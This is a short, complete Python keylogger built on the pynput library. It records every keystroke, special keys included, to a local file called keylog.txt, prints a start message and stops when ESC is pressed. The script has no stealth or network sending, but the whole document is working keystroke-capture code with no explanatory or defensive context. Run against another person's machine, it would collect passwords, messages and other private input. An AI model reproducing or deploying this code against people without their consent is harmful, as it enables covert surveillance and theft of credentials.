from pynput import keyboard


log_file = "keylog.txt"


def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(key.char)
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"[{key}]")

    # Stop on ESC key
    if key == keyboard.Key.esc:
        return False


with keyboard.Listener(on_press=on_press) as listener:
    print("Keylogger started... Press ESC to stop.")
    listener.join()